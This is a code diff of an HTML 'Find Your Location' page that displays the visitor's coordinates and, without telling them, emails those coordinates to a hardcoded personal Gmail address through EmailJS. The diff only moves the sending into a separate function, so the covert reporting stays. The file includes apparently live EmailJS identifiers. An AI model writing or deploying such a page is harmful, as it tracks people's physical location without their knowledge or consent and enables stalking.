@@ -20,17 +20,16 @@
       cursor: pointer;
     }
   </style>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
   <h1>Find Your Location</h1>
   <button id="getLocationBtn">Get My Location</button>
   <div id="location"></div>
 
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    (function() {
-      emailjs.init('9x-l5mk9badvHiIkw'); // Replace with your EmailJS user ID
-    })();
+    // Initialize EmailJS
+    emailjs.init('9x-l5mk9badvHiIkw');  // Replace 'YOUR_USER_ID' with your EmailJS user ID
 
     const button = document.getElementById('getLocationBtn');
     const locationDiv = document.getElementById('location');
@@ -42,20 +41,8 @@
             const { latitude, longitude } = position.coords;
             locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
-            // Send email with the coordinates
-            const emailParams = {
-              to_email: 'alex69gggamer@gmail.com',  // Replace with your email
-              latitude: latitude,
-              longitude: longitude
-            };
-
-            emailjs.send('service_3ubhjey', 'template_lytk4r9', emailParams)
-              .then((response) => {
-                console.log('Email sent successfully', response);
-              })
-              .catch((error) => {
-                console.error('Error sending email', error);
-              });
+            // Send the coordinates via email
+            sendEmail(latitude, longitude);
           },
           (error) => {
             locationDiv.textContent = `Error: ${error.message}`;
@@ -65,6 +52,22 @@
         locationDiv.textContent = "Geolocation is not supported by your browser.";
       }
     });
+
+    function sendEmail(latitude, longitude) {
+      const templateParams = {
+        to_email: 'alex69gggamer@gmail.com',  // Replace with your email address
+        latitude: latitude,
+        longitude: longitude
+      };
+
+      emailjs.send('service_3ubhjey', 'template_lytk4r9', templateParams)  // Replace with your EmailJS service ID and template ID
+        .then((response) => {
+          console.log('Email sent successfully:', response);
+        })
+        .catch((error) => {
+          console.log('Error sending email:', error);
+        });
+    }
   </script>
 </body>
 </html>
